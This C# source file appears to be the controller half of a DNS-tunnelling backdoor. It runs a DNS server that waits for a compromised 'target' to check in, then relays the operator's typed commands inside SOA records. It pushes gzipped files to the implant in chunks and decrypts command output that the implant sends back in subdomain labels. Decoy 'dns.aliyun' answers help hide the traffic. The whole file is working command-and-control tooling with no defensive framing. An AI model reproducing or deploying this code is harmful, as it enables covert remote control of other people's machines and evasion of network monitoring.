using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ARSoft.Tools.Net.Dns;
using ARSoft.Tools.Net;
using System.Threading.Tasks;
using System.IO;
using System.IO.Compression;

namespace DNSServer
{
    class Program
    {
        static List<string> sendDate = new List<string> { };
        static void Main(string[] args)
        {
            var maxConnection = 100;
            DnsServer dnsServer = new DnsServer(maxConnection, maxConnection);
            dnsServer.QueryReceived += DnsServer_QueryReceived;
            dnsServer.Start();
            while (true)
            {
                while (true)
                {
                    if (Options.live)
                    {
                        Console.WriteLine("目标上线");
                        break;
                    }
                    
                }
                Console.WriteLine("请输入命令：");
                Options.command = Console.ReadLine();
                Options.readline = false;
                //Console.WriteLine(Options.command);
                while (true)
                {
                    if (Options.readline)
                        break;
                }
            }
            Console.Read();
        }
        private static Task DnsServer_QueryReceived(object sender, QueryReceivedEventArgs eventArgs)
        {
            eventArgs.Query.IsQuery = false;
            DnsMessage query = eventArgs.Query as DnsMessage;
            if (query == null || query.Questions.Count <= 0)
                query.ReturnCode = ReturnCode.ServerFailure;
            else
            {
                if (query.Questions[0].RecordType == RecordType.Soa)
                {

                    foreach (DnsQuestion dnsQuestion in query.Questions)
                    {
                        string domainName = dnsQuestion.Name.ToString().Remove(dnsQuestion.Name.ToString().Length - 1, 1);
                        if ((Options.command != "header") && (!Options.command.Contains("put")))
                        {
                            Options.SN = 0;
                            Options.flag = "true";
                            sendDate = Encryption.SplitLength(Encoding.UTF8.GetBytes(Options.command));
                            SoaRecord soaRecordc = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new string[] { Options.flag }), new DomainName(sendDate.ToArray()), Options.SN, 0, 4, 4, 4);
                            query.AnswerRecords.Add(soaRecordc);
                            Options.flag = "fasle";
                            Options.command = "header";
                        }
                        else if (Options.command.Contains("put"))
                        {
                            try
                            {
                                Options.flag = "true";
                                Options.SN = 0;
                                sendDate = Encryption.SplitLength(Encoding.UTF8.GetBytes(Options.command));
                                Console.WriteLine(Options.command.Split(' ')[1]);
                                FileStream fileStream = new FileStream(Options.command.Split(' ')[1], FileMode.Open, FileAccess.Read);
                                byte[] bytes = new byte[fileStream.Length];
                                fileStream.Read(bytes, 0, bytes.Length);
                                byte[] gzipBytes = gzipCompress(bytes);
                                //string fileString = Encryption.ByteArrayToHexString(gzipBytes);
                                List<string> temp = Encryption.SplitLength(gzipBytes);
                                //Console.WriteLine(string.Join("", temp));
                                //Console.WriteLine(temp.Count);
                                int length = temp.Count() / 3;
                                int mod = temp.Count() % 3;
                                for (int i = 0; i < length; i++)
                                {
                                    string post = "";
                                    var l = temp.GetRange(i * 3, 3);
                                    foreach (string s in l)
                                    {
                                        post += s + ".";
                                    }
                                    Options.fileDate.Enqueue(post.TrimEnd('.'));
                                }
                                if (mod != 0)
                                {
                                    string aa = "";
                                    foreach (string a in temp.GetRange(length * 3, mod))
                                    {
                                        aa += a + ".";
                                    }
                                    Options.fileDate.Enqueue(aa.TrimEnd('.'));
                                }
                                //Console.WriteLine(Options.fileDate.Count);
                                SoaRecord soaRecordf = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new string[] { Options.flag }), new DomainName(sendDate.ToArray()), 0, Options.fileDate.Count, 4, 4, 4);
                                query.AnswerRecords.Add(soaRecordf);
                                Options.flag = "false";
                                Options.command = "header";
                                sendDate.Clear();
                            }
                            catch
                            {
                                Console.WriteLine("文件错误");
                                SoaRecord soaRecordf = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new string[] { "dns", "aliyun" }), new DomainName(new string[] { "dns", "aliyun" }), 0, Options.fileDate.Count, 4, 4, 4);
                                query.AnswerRecords.Add(soaRecordf);
                                Options.flag = "false";
                                Options.command = "header";
                                sendDate.Clear();
                            }
                        }
                        else if (domainName.StartsWith("ftp"))
                        {
                            //Console.WriteLine("要发送数据长度：  " + Options.fileDate.Count.ToString());
                            try
                            {
                                SoaRecord soaRecordftp = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new string[] { Options.flag }), new DomainName(Options.fileDate.Dequeue().Split('.')), 1, 4, Options.key, 4, 4);
                                query.AnswerRecords.Add(soaRecordftp);
                                Options.key++;
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.ToString());
                            }
                            Options.readline = true;
                            Options.recDate.Clear();
                        }
                        else if (domainName.StartsWith("live"))
                        {
                            Options.live = true;
                            SoaRecord soaRecord = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new String[] { "dns", "aliyun" }), new DomainName(new String[] { "dns", "aliyun" }), 4, 4, 4, 4, 4);
                            query.AnswerRecords.Add(soaRecord);
                        }
                        else
                        {
                            SoaRecord soaRecord = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new String[] { "dns", "aliyun" }), new DomainName(new String[] { "dns", "aliyun" }), 4, 4, 4, 4, 4);
                            query.AnswerRecords.Add(soaRecord);
                        }                        
                        if (domainName.StartsWith("header"))
                        {
                            SoaRecord soaRecord = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new String[] { "dns", "aliyun" }), new DomainName(new String[] { "dns", "aliyun" }), 4, 4, 4, 4, 4);
                            query.AnswerRecords.Add(soaRecord);
                            Options.cmd5 = domainName.Split('.')[1];
                            foreach (string subdomain in domainName.Split('.').ToList().GetRange(2, domainName.Split('.').Length - 4))
                            {
                                Options.recDate.Add(subdomain);
                            }
                            if (Options.cmd5 == GetMD5Hash(string.Join("", Options.recDate)))
                            {
                                Console.WriteLine(Encoding.UTF8.GetString(Encryption.Decrypt(Encryption.HexStringToByteArray(string.Join("", Options.recDate)))));
                                Options.readline = true;
                                Options.recDate.Clear();
                            }
                        }
                        //Console.WriteLine("SOA请求");

                        Options.SN = 0;
                    }
                }
            }
            eventArgs.Response = eventArgs.Query;
            return Task.FromResult(0);
        }


        public static string GetMD5Hash(string bytedata)
        {
            try
            {
                System.Security.Cryptography.MD5 md5 = new System.Security.Cryptography.MD5CryptoServiceProvider();
                byte[] retVal = md5.ComputeHash(Encoding.UTF8.GetBytes(bytedata));
                StringBuilder sBuilder = new StringBuilder();

                // 循环遍历哈希数据的每一个字节并格式化为十六进制字符串
                for (int i = 0; i < retVal.Length; i++)
                {
                    sBuilder.Append(retVal[i].ToString("x2"));
                }
                //Console.WriteLine(sBuilder.ToString());
                return sBuilder.ToString();
            }
            catch (Exception ex)
            {
                throw new Exception("GetMD5Hash() fail,error:" + ex.Message);
            }

        }
        public static byte[] gzipCompress(byte[] data)
        {
            try
            {
                MemoryStream ms = new MemoryStream();
                GZipStream zip = new GZipStream(ms, CompressionMode.Compress, true);
                zip.Write(data, 0, data.Length);
                zip.Close();
                byte[] buffer = new byte[ms.Length];
                ms.Position = 0;
                ms.Read(buffer, 0, buffer.Length);
                ms.Close();
                return buffer;

            }
            catch (Exception e)
            {
                throw new Exception(e.Message);
            }
        }
    }
}
